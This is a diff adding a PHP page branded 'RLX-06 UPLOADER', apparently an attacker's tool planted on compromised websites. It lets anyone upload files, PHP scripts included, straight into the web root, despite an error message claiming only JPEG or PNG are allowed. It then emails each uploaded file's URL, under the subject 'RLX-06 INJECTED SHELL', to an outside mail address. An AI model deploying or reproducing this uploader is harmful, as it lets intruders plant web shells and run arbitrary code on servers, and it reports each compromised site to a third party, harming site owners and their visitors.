@@ -1,0 +1,70 @@
+<?php
+   if(isset($_FILES['image'])){
+	  $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
+	  $site = $_SERVER['HTTP_HOST'];
+	  $maindir = $_SERVER['DOCUMENT_ROOT'];
+	  $errors= array();
+      $file_name = $_FILES['image']['name'];
+      $file_size =$_FILES['image']['size'];
+      $file_tmp =$_FILES['image']['tmp_name'];
+      $file_type=$_FILES['image']['type'];
+      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
+	  $sender = 'result';
+	  $message .= "NEW SHELL: $protocol$site/$file_name"."\n";
+	  $recipient = "rlx-06@mail.com";
+	  $headers = "From: KEYWORD<$sender>\n";
+	  $subject = "RLX-06 INJECTED SHELL $site";
+      
+      $expensions= array("php","jpg","png");
+      
+      if(in_array($file_ext,$expensions)=== false){
+         $errors[]="extension not allowed, please choose a JPEG or PNG file.";
+      }
+      
+      if($file_size > 2097152){
+         $errors[]='File size must be excately 2 MB';
+      }
+      
+      if(empty($errors)==true){
+         move_uploaded_file($file_tmp,"$maindir/".$file_name);
+		 mail($recipient,$subject,$message,$headers);
+         echo "<center><h5><font color=green> >>>>>> </font>NEWLY UPLOADED FILE LOCATION: <a href='$protocol$site/$file_name'> $protocol$site/$file_name</a> </H5><center>";
+      }else{
+         print_r($errors);
+      }
+   }
+?>
+<html><title>RLX-06 UPLOADER &copy;</title>
+<style type="text/css">
+<!--
+.style2 {font-family: Georgia, "Times New Roman", Times, serif}
+.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
+-->
+</style>
+<body>
+      <center>
+      <form action="" method="POST" enctype="multipart/form-data">
+        
+         <p>&nbsp;         </p>
+         <p>&nbsp;</p>
+         <p><br>
+         </p>
+         <div align="center" class="form"> 
+           <p>
+             <input name="image" type="file" style='background-color: #FFFFFF; color:#000000;border:none;' />
+             <input name="submit" type=submit style='background-color: #FFFFFF; color:#000000;border:none;' value='GO'>
+</p>
+           <p>&copy; 2016 SMART UPLOADER <strong> <br>  
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >L</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >X</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >-</spam>
+             <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >0</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >6</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >I</spam>
+                 <spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" > </spam>
+             </strong> </p>
+        </div></form>
+      </center>
+</body>
+</html>
